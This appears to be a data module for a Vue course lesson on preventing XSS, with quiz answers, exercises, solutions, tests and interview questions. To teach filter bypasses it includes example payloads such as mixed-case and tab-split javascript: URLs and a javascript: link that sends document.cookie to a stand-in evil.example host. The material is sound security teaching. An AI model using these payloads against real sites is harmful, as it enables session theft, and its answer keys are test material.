        { text: '`https://example.com`', why: 'This passes the filter, but it\'s a normal, safe https link.' },
        { text: 'None — the filter blocks all of them', why: 'Browsers treat URL schemes case-insensitively, so a capitalised scheme is still a script URL.' },
      ],
      answer: 1,
      explanation: '`startsWith` is case-sensitive, but browsers are not: `JavaScript:` still runs. Leading spaces and embedded tabs bypass it too. Parse with `new URL()` and allow-list `url.protocol`.',
    },
    {
      id: 'xss-safe-rendering-q7',
      type: 'short',
      prompt: 'Why doesn\'t Vue\'s escaping protect `<a :href="user.website">`?',
      answer: 'Escaping only stops a value from changing the HTML structure (no new tags or attributes). A `javascript:alert(1)` URL needs no special characters — it is a valid href value whose *meaning* is "run this script" when clicked. So URLs must be validated (allow-list of schemes via `new URL().protocol`), ideally on the backend too.',
    },
  ],

  exercises: [
    {
      id: 'harden-safe-url',
      title: 'Harden a leaky link filter',
      difficulty: 'intermediate',
      prompt: `
A teammate wrote \`safeUrl.js\` as a **blocklist**. Mallory's profile already gets past it. Rewrite it as an **allow-list**.

Requirements for \`safeUrl(input)\` (exported from \`safeUrl.js\`):

- Returns the URL for absolute \`https:\`, \`http:\` and \`mailto:\` URLs (e.g. \`'https://vuejs.org/guide/'\` → \`'https://vuejs.org/guide/'\`).
- Returns \`'#'\` for \`javascript:\` in **any letter case**, even with leading spaces or tabs hidden inside the scheme.
- Returns \`'#'\` for \`data:\` and \`vbscript:\` URLs, for strings that aren't absolute URLs (\`'not a url'\`), and for non-strings (\`null\`).
- \`App.vue\` already renders each profile's link as \`<a class="site">\` using \`safeUrl()\` — don't change it.
`,
      files: { 'App.vue': profileApp, 'safeUrl.js': naiveSafeUrl },
      hints: [
        'Stop asking "does it look bad?" and start asking "is it one of the few things I trust?".',
        'Parse the input with `new URL(input)` inside a `try`/`catch` — invalid URLs throw.',
        'Compare `url.protocol` (lowercase, with the colon) against `[\'https:\', \'http:\', \'mailto:\']` and return `url.href` or `\'#\'`. Check `typeof input === \'string\'` first.',
      ],
      solution: {
        explanation: 'The browser\'s URL parser normalises the scheme exactly like the browser does when a link is clicked: lowercase, with tabs and newlines removed and surrounding spaces trimmed. Comparing that normalised `protocol` with a short allow-list means every unknown or dangerous scheme is refused by default — including ones you never thought of.',
        files: { 'App.vue': profileApp, 'safeUrl.js': hardenedSafeUrl },
      },
      tests: [
        { name: 'keeps https links', code: `const { safeUrl } = requireModule('safeUrl.js')\nexpect(safeUrl('https://vuejs.org/guide/')).toBe('https://vuejs.org/guide/')` },
        { name: 'keeps mailto links', code: `const { safeUrl } = requireModule('safeUrl.js')\nexpect(safeUrl('mailto:team@example.com')).toBe('mailto:team@example.com')` },
        { name: 'blocks javascript: in any letter case', code: `const { safeUrl } = requireModule('safeUrl.js')\nexpect(safeUrl('JaVaScRiPt:alert(1)')).toBe('#')` },
        { name: 'blocks javascript: hidden behind spaces and tabs', code: `const { safeUrl } = requireModule('safeUrl.js')\nexpect(safeUrl('  java\\tscript:alert(1)')).toBe('#')` },
        { name: 'blocks data: and vbscript: URLs', code: `const { safeUrl } = requireModule('safeUrl.js')\nexpect(safeUrl('data:text/html;base64,PHNjcmlwdD4=')).toBe('#')\nexpect(safeUrl('vbscript:msgbox(1)')).toBe('#')` },
        { name: 'rejects non-URLs and non-strings', code: `const { safeUrl } = requireModule('safeUrl.js')\nexpect(safeUrl('not a url')).toBe('#')\nexpect(safeUrl(null)).toBe('#')` },
        { name: 'Mallory\'s rendered link is neutralised', code: `const links = findAll('.site')\nexpect(links[0].getAttribute('href')).toBe('https://example.com/ada')\nexpect(links[1].getAttribute('href')).toBe('#')` },
      ],
    },
    {
      id: 'safe-bio-formatting',
      title: 'Bold text without v-html',
      difficulty: 'intermediate',
      prompt: `
Users may write \`*like this*\` in their bio to get **bold** text. The current \`Bio.vue\` does it with a regex and \`v-html\` — so any HTML in the bio becomes real elements. Replace it with **structured rendering**.

- In \`format.js\`, implement \`formatBio(text)\` returning an array of segments \`{ text, bold }\`: \`'a *b* c'\` → \`[{ text: 'a ', bold: false }, { text: 'b', bold: true }, { text: ' c', bold: false }]\` (no empty segments).
- In \`Bio.vue\`, render the segments inside \`<p class="bio">\`: bold segments in a \`<strong>\`, the others as text. **No \`v-html\`.**
- HTML in the bio (like \`<script>\`) must appear as visible characters, not as elements.
`,
      files: { 'App.vue': bioApp, 'Bio.vue': bioStarter, 'format.js': formatStarter },
      hints: [
        'The idea: let a function produce *data* (segments), and let the template turn data into elements — Vue then escapes every piece of text for you.',
        '`text.split(/\\*([^*]+)\\*/)` keeps the captured parts: even indexes are plain text, odd indexes were between stars.',
        'In the template: `<template v-for="(seg, i) in segments" :key="i"><strong v-if="seg.bold">{{ seg.text }}</strong><span v-else>{{ seg.text }}</span></template>`.',
      ],
      solution: {
        explanation: 'The formatter never produces HTML — it produces a small data structure. The template turns each segment into an element with interpolation inside, so user text is always a text node. This is the same idea safe Markdown renderers use: build structure, not strings.',
        files: { 'App.vue': bioApp, 'Bio.vue': bioSolution, 'format.js': formatSolution },
      },
      tests: [
        {
          name: 'formatBio splits text into bold and plain segments',
          code: `const { formatBio } = requireModule('format.js')
const segs = formatBio('a *b* c')
expect(segs.map((s) => s.text)).toEqual(['a ', 'b', ' c'])
expect(segs.map((s) => s.bold)).toEqual([false, true, false])`,
        },
        { name: 'formatBio returns no empty segments', code: `const { formatBio } = requireModule('format.js')\nconst segs = formatBio('*hi*')\nexpect(segs.length).toBe(1)\nexpect(segs[0].text).toBe('hi')\nexpect(segs[0].bold).toBe(true)` },
        { name: '*Vue apps* is rendered in a <strong>', code: `expect(find('.bio strong')).toBeTruthy()\nexpect(text('.bio strong')).toBe('Vue apps')` },
        { name: 'HTML in the bio stays visible text', code: `expect(find('.bio script')).toBeNull()\nexpect(text('.bio')).toContain('<script>steal()</script>')` },
      ],
    },
  ],

  interview: [
    {
      id: 'xss-safe-rendering-prevent',
      difficulty: 'beginner',
      type: 'conceptual',
      minutes: 3,
      question: 'How do you prevent XSS in a Vue application?',
      answer: 'Rely on Vue\'s default escaping: render user content with `{{ }}` and attribute bindings, which create text nodes and plain attribute values. Avoid `v-html`/`innerHTML` with user data, or sanitize with a maintained allow-list sanitizer first. Validate URLs against an allow-list of schemes before binding `href`/`src`, never spread untrusted objects or compile untrusted templates, sanitize and validate on the backend too, and add a CSP as defense in depth.',
      explanation: 'Vue makes the safe path the easy path. The vulnerabilities live in the escape hatches: raw HTML, URLs, styles/attributes, direct DOM access, and runtime templates.',
      whyAsked: 'XSS is the most common frontend vulnerability. Interviewers want to see that you know what the framework already does and where your responsibility starts.',
      mistakes: [
        'Saying "Vue prevents XSS automatically" without naming the exceptions.',
        'Forgetting `javascript:` URLs — the hole escaping can\'t close.',
        'Proposing regex tag-stripping as a sanitizer.',
        'Ignoring the backend.',
      ],
      followUps: [
        'Why is `:href` not protected by escaping?',
        'How would you render user-written Markdown?',
        'What does a Content Security Policy add?',
      ],
      modelAnswer: 'XSS means attacker-controlled data ends up executing as script in another user\'s session. Vue\'s defaults already protect most rendering: interpolation and attribute bindings escape values, so I render user content with `{{ }}`. The risky spots are escape hatches — `v-html` and `innerHTML`, which I only use with sanitized HTML; URLs in `href` or `src`, which I validate with `new URL()` and an allow-list of schemes; and spreading untrusted objects or compiling user templates, which I never do. On top of that the backend validates and sanitizes, and a CSP limits the damage if something slips through.',
    },
    {
      id: 'xss-safe-rendering-escaping-output',
      difficulty: 'beginner',
      type: 'output',
      minutes: 2,
      question: 'What ends up in the DOM for `<p>{{ msg }}</p>` when `msg` is `\'<script>alert(1)</script>\'`?',
      code: {
        lang: 'vue',
        code: `<script setup>
const msg = '<script>alert(1)<\\/script>'
</script>

<template>
  <p>{{ msg }}</p>
</template>`,
      },
      options: [
        'A <script> element that runs once',
        'A <p> containing one text node with the literal characters',
        'An empty <p> — Vue removes script tags',
        'A compile-time error',
      ],
      correctOption: 1,
      answer: 'A `<p>` element whose only child is a text node containing the characters `<script>alert(1)</script>`. Nothing runs; the visitor simply sees the text. (If you inspect it with `innerHTML` you\'ll see the characters escaped as `&lt;script&gt;…`.)',
      explanation: 'Interpolation goes through text-node APIs, which never invoke the HTML parser.',
      whyAsked: 'Confirms you understand escaping concretely — and that you won\'t "fix" safe code by adding a sanitizer where none is needed.',
      mistakes: ['Thinking Vue strips or removes tags.', 'Confusing interpolation with `v-html`.'],
      followUps: ['What would happen with `v-html` instead? Would the script run?', 'Why do `<script>` tags inserted via innerHTML not execute, yet `<img onerror>` does?'],
      modelAnswer: 'You get a paragraph containing a single text node with those exact characters — the visitor sees the script tag as text and nothing executes. Interpolation uses text-node APIs, so the browser never parses the string as HTML. In the serialized HTML the angle brackets show up escaped as entities. That\'s the reason interpolation is the default for any user content.',
    },
    {
      id: 'xss-safe-rendering-href-debug',
      difficulty: 'intermediate',
      type: 'debugging',
      minutes: 4,
      question: 'A security scan flags this profile component even though it never uses `v-html`. Find the vulnerability and fix it.',
      code: {
        lang: 'vue',
        code: `<script setup>
defineProps({ user: Object })
</script>

<template>
  <div class="profile">
    <h2>{{ user.name }}</h2>
    <a :href="user.website">Visit my site</a>
  </div>
</template>`,
      },
      answer: '`user.website` is user-controlled and bound to `href` without validation. A value like `javascript:fetch(\'https://evil.example/?c=\'+document.cookie)` runs when clicked. Fix: validate with an allow-list — `:href="safeUrl(user.website)"` where `safeUrl` parses with `new URL()` and only accepts `https:`/`http:` (maybe `mailto:`) — and validate on the backend before saving.',
      explanation: 'Escaping keeps the value inside the attribute, but the attribute\'s *meaning* is "navigate here", and `javascript:` navigation means "run this".',
      whyAsked: 'Separates people who memorised "avoid v-html" from people who understand why escaping works and where it stops working.',
      mistakes: [
        'Saying it is safe because Vue escapes attributes.',
        'Fixing it with `startsWith(\'javascript:\')` — bypassed by case changes and whitespace.',
        'Only fixing it in the frontend.',
      ],
      followUps: ['What other attributes take URLs?', 'Why parse with `new URL()` rather than a regex?', 'Would a CSP help here?'],
      modelAnswer: 'The bug is the unvalidated `:href`. Vue escapes the value, so it can\'t break out of the attribute, but a `javascript:` URL is a valid value that executes on click. I\'d route it through a `safeUrl` helper that parses with `new URL()` and allows only a short list of protocols, falling back to `#` or rendering plain text instead of a link. The backend should apply the same rule before storing the URL. A strict CSP without `unsafe-inline` would also block `javascript:` URLs as a second layer, but validation is the actual fix.',
    },
    {
      id: 'xss-safe-rendering-markdown',
      difficulty: 'advanced',
      type: 'scenario',
      minutes: 5,
      question: 'Product wants users to write comments in Markdown with links and code blocks. How do you render them safely in Vue?',
      answer: 'Treat it as an HTML-sanitization problem. Convert Markdown to HTML with a renderer configured to disallow raw HTML, then sanitize the output with a maintained allow-list sanitizer (allowed tags such as `p`, `a`, `code`, `pre`, `ul`; `a[href]` only with `https:`/`mailto:`; no event attributes, no `style`), and only then use `v-html`. Do the same sanitization on the server (store sanitized HTML or sanitize on read), add `rel="nofollow ugc noopener"` to links, and back it with a strict CSP. Alternatively, use a renderer that produces a token tree rendered with Vue components, so no HTML string is ever parsed.',
      explanation: 'Markdown allows raw HTML in many implementations, and links can carry `javascript:` URLs, so "it\'s just Markdown" is not a safety argument.',
      whyAsked: 'A realistic feature request where the naive implementation (`v-html="marked(text)"`) is an XSS hole.',
      mistakes: [
        '`v-html="markdownToHtml(text)"` with no sanitizer.',
        'Sanitizing only in the frontend.',
        'Allowing all attributes or `style`.',
        'Forgetting that Markdown links can be `javascript:` URLs.',
      ],
      followUps: ['Where would you sanitize: on write or on read?', 'How would you test the sanitizer?', 'What does CSP add here?'],
      modelAnswer: 'Markdown becomes HTML, so I treat this as rendering untrusted HTML. I\'d configure the Markdown renderer to drop raw HTML, pass its output through a maintained sanitizer with a tight allow-list — paragraphs, lists, code, links with only https or mailto, no event attributes or inline styles — and only then use `v-html`. The server sanitizes too, because other clients read the same comments. Links get `rel="nofollow ugc noopener"`, and a strict CSP is the safety net. If the team prefers, a token-based renderer that maps Markdown nodes to Vue elements avoids HTML strings entirely.',
    },
    {
      id: 'xss-safe-rendering-layers',
      difficulty: 'advanced',
      type: 'architecture',
      minutes: 5,
      question: 'Describe a defense-in-depth strategy against XSS for a Vue SPA with a REST backend. What does each layer contribute?',
      answer: '1) **Output encoding**: Vue\'s interpolation and attribute escaping as the default. 2) **Sanitization**: allow-list sanitizer wherever HTML must be rendered, on both server and client. 3) **Validation**: allow-listed URL schemes, typed/validated API inputs on the server. 4) **CSP**: block inline scripts and unexpected script origins so an injection can\'t easily execute or load code. 5) **Blast-radius reduction**: httpOnly cookies so injected script can\'t read session tokens, short-lived tokens, re-authentication for sensitive actions. 6) **Process**: lint rules for `v-html`, code review, dependency audits, security tests.',
      explanation: 'No single layer is perfect; each one catches what the others miss or limits the damage.',
      whyAsked: 'Senior candidates are expected to think in layers and trade-offs, not single fixes.',
      mistakes: ['Listing only one measure.', 'Claiming CSP alone prevents XSS.', 'Forgetting that httpOnly cookies limit token theft but not actions performed from the page.'],
      followUps: ['If an attacker achieves XSS despite httpOnly cookies, what can they still do?', 'How do nonces in CSP work?'],
      modelAnswer: 'I think of it in layers. First, prevention at output: Vue\'s escaping is the default and `v-html` is reviewed and sanitized. Second, validation and sanitization on the server, so every client is protected and URLs are allow-listed before storage. Third, a strict CSP that blocks inline scripts and unknown origins, so an injection is hard to exploit. Fourth, limiting blast radius: httpOnly session cookies, short-lived tokens and re-authentication for sensitive actions — though injected script can still act as the user while the page is open. Finally process: lint rules, reviews and dependency audits.',
    },
    {
      id: 'xss-safe-rendering-coding-escape',
      difficulty: 'intermediate',
      type: 'coding',
      minutes: 8,
      question: 'Sometimes you must build an HTML string outside Vue (for example an email preview generated in JavaScript). Implement `escapeHtml(value)` in `escape.js` so user text can be placed safely between tags or inside double- or single-quoted attributes.',
      starter: {
        files: {
          'escape.js': `// Convert any value to a string that is safe inside HTML text and quoted attributes.
export function escapeHtml(value) {
  return value
}`,
          'App.vue': `<script setup>
import { escapeHtml } from './escape.js'

const name = 'Tom & "Jerry" <script>'
const preview = '<p>Hello, ' + escapeHtml(name) + '</p>'
</script>

<template>
  <pre class="preview">{{ preview }}</pre>
</template>`,
        },
      },
      tests: [
        { name: 'escapes < and >', code: `const { escapeHtml } = requireModule('escape.js')\nexpect(escapeHtml('<b>')).toBe('&lt;b&gt;')` },
        { name: 'escapes & first (no double-escaping bugs)', code: `const { escapeHtml } = requireModule('escape.js')\nexpect(escapeHtml('a & b')).toBe('a &amp; b')\nexpect(escapeHtml('&lt;')).toBe('&amp;lt;')` },
        { name: 'escapes double and single quotes', code: `const { escapeHtml } = requireModule('escape.js')\nexpect(escapeHtml('"hi"')).toBe('&quot;hi&quot;')\nexpect(escapeHtml("it's")).toBe('it&#39;s')` },
        { name: 'turns non-strings into strings', code: `const { escapeHtml } = requireModule('escape.js')\nexpect(escapeHtml(42)).toBe('42')` },
      ],
      hints: [
        'Five characters matter: `&`, `<`, `>`, `"` and `\'`.',
        'Replace `&` **first** — otherwise you would re-escape the `&` of the entities you just created.',
        'A lookup object plus `String(value).replace(/[&<>"\']/g, (ch) => map[ch])` handles all five in one pass.',
      ],
      answer: 'Convert to a string, then replace each of the five special characters with its entity: `&` → `&amp;`, `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`, `\'` → `&#39;`. A single regex pass with a lookup map avoids ordering bugs.',
      solution: {
        files: {
          'escape.js': `const ENTITIES = {
  '&': '&amp;',
  '<': '&lt;',
  '>': '&gt;',
  '"': '&quot;',
  "'": '&#39;',
}

export function escapeHtml(value) {
  return String(value).replace(/[&<>"']/g, (ch) => ENTITIES[ch])
}`,
          'App.vue': `<script setup>
import { escapeHtml } from './escape.js'

const name = 'Tom & "Jerry" <script>'
const preview = '<p>Hello, ' + escapeHtml(name) + '</p>'
</script>

<template>
  <pre class="preview">{{ preview }}</pre>
</template>`,
        },
      },
      explanation: 'One pass over the string with a lookup map means each character is replaced exactly once, so `&` can\'t be double-escaped. Note that this makes text safe for HTML *text and quoted attributes* only — it does nothing for URLs, CSS or JavaScript contexts, which need their own validation.',
      whyAsked: 'Tests whether you understand what escaping actually does — and its limits — instead of treating it as magic.',
      mistakes: ['Escaping `&` last, which double-escapes.', 'Forgetting quotes, which breaks attribute contexts.', 'Believing HTML escaping also makes a URL safe in `href`.'],
      followUps: ['Why isn\'t this enough for `<a href="...">`?', 'Why don\'t you need this function inside Vue templates?', 'When would you prefer building DOM nodes over strings?'],
      modelAnswer: 'I\'d convert the input to a string and replace the five HTML-significant characters — ampersand, less-than, greater-than, double and single quote — with their entities in one regex pass using a lookup map, so the ampersand can\'t be escaped twice. That makes the value safe inside element text and quoted attributes. It doesn\'t make a URL safe for `href`, and inside Vue templates I wouldn\'t need it at all, because interpolation already escapes.',
    },
  ],

  takeaways: [
    'XSS = attacker data running as code in another user\'s session; stored XSS attacks every visitor.',
    'Vue escapes `{{ }}` and attribute bindings — render user content that way by default.',
    '`v-html`, `innerHTML`, user URLs, user styles, `v-bind="obj"` and runtime templates are the doors you must lock yourself.',
    'Validate URLs with `new URL()` and an allow-list of protocols; block-lists are always bypassed.',
    'If you need user HTML, sanitize with a maintained allow-list sanitizer — on the server and before `v-html`.',
    'Defense in depth: server validation, client escaping/sanitizing, CSP, and httpOnly cookies to limit damage.',
  ],
}
